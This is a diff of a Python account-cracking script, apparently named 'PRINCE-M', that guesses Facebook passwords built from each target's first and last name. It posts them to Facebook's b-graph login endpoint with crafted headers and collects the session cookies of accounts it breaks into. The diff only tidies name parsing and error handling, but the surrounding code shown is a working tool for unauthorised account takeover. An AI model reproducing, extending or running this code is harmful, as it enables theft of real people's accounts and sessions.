@@ -457,15 +457,14 @@ def file_sub(uid, pwx, name, meth, file):
     sys.stdout.write(
         f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}PRINCE-M{meth}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
     sys.stdout.flush()
+
+    fs = name.split(' ')[0]
     try:
-
-        fs = name.split(' ')[0]
-        try:
-            ls = name.split(' ')[1]
-        except:
-            ls = fs
+        ls = name.split(' ')[1]
+    except:
+        ls = fs
+    try:
         for pw in pwx:
-
             ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
@@ -532,7 +531,6 @@ def file_sub(uid, pwx, name, meth, file):
                 'X-fb-connection-token': f'{shuffled_connection_token}', }
             url1 = 'https://b-graph.facebook.com/auth/login'
             po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()
-
             if "session_key" in po:
                 oks.append(uid)
                 coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
@@ -550,9 +548,10 @@ def file_sub(uid, pwx, name, meth, file):
             else:
                 continue
         loop += 1
-    except:
-
+    except Exception as e:
         time.sleep(30)
+
+
 
 
 def ran():
